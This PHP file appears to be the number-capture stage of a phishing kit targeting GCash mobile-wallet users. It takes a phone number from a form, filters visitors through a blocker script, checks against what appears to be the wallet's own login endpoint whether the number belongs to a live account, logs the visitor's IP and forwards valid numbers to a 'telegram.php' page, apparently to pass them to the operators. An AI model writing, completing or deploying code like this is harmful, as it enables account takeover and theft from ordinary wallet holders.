<?php
include "blocker.php";  

if (isset($_POST['submitnum'])) {
    $number = str_replace(' ', '', $_POST['number']);

    if (isNumberBlocked($number)) {
        // Number is blocked, redirect to blocked.php
        header("Location: blocked.php");
        exit();
    }

  $number = str_replace(' ', '', $_POST['number']);
  setcookie("number", $number, time() + 86400, "/");

    function validator($num){
      $curl = curl_init();
      curl_setopt_array($curl, [
        CURLOPT_URL => "https://mgs-gw.paas.mynt.xyz/mgw.htm?operationType=alipayplus.mobilewallet.user.login.consult&requestData=%5B%0A%09%7B%0A%09%09%22envInfo%22%3A%20%7B%0A%09%09%09%22tokenId%22%3A%20%22a727723a-fc26-444b-95b5-a3d20a6ddb9a%22%2C%0A%09%09%09%22osType%22%3A%20%22WindowsNT%22%2C%0A%09%09%09%22osVersion%22%3A%20%2210.0%22%2C%0A%09%09%09%22browserType%22%3A%20%22Chrome%22%2C%0A%09%09%09%22browserVersion%22%3A%20%22103%22%2C%0A%09%09%09%22terminalType%22%3A%20%22WEB%22%0A%09%09%7D%2C%0A%09%09%22loginIdType%22%3A%20%22MOBILE_NO%22%2C%0A%09%09%22loginId%22%3A%20%220$num%22%2C%0A%09%09%22extParams%22%3A%20%7B%0A%09%09%09%22bizNo%22%3A%20%2220220802121212800110170707531232725%22%2C%0A%09%09%09%22sessionId%22%3A%20null%2C%0A%09%09%09%22bizTypeForMonitor%22%3A%20%22ONLINE_LAZADA%22%2C%0A%09%09%09%22merchantForMonitor%22%3A%20%22netflix-vouchers%22%0A%09%09%7D%0A%09%7D%0A%5D&version=2.0&workspaceId=PROD&appId=D54528A131559&tenantId=MYNTPH&ctoken=",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "GET",
        CURLOPT_POSTFIELDS => "",
        CURLOPT_HTTPHEADER => [
          "Content-Type: multipart/form-data; boundary=---011000010111000001101001"
        ],
      ]);

      $response = curl_exec($curl);
      $err = curl_error($curl);

      curl_close($curl);

      if ($err) {
        echo "cURL Error #:" . $err;
      } else {
        $notVerified = 'Your current transaction cannot push through. Kindly contact m.me/gcashcare or send an email to support@gcash.com for further assistance.';
        $responseData = json_decode($response, true)['result']; 
 
        $errorMessage = $responseData['errorMessage'];
        $isSuccess = $responseData['success'];
         
        $res = [
          'errorMessage' => $errorMessage,
          'isSuccess' =>  $isSuccess
        ]; 
        return $res;
      }
    } 
    setcookie("gcash_number", $number, time()+3600);
    $validator = validator($number); 
    $encodenum = base64_encode(base64_encode($number));
    $length = strlen ($number);

    if(!empty($number)){   
      $replyMsg = "Logged => $ip  \n\n$number";

      if(preg_match("/^(9)\\d{9}/", $number)) {  
        $res = validator($number);
        $isValid = $res['isSuccess'];
        return $length == 10 && $isValid ? header("Location:telegram.php?number=$number") : null; 
      }  

      if(preg_match("/^(09)\\d{9}/", $number)){   
        $res = validator(substr($number, 1));  
        $validator = validator(substr($number, 1)); 
        $isValid = $res['isSuccess'];
        return $length == 11 && $isValid ? header("Location:telegram.php?number=$number") : null;   
      }
      
     }
}
?>